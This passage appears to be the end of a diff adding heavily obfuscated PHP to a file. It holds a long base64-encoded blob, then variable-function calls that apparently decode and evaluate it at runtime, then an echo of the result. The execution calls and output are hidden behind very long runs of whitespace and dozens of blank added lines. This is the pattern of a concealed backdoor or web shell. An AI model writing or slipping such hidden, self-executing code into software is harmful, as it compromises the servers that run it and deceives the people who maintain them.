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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
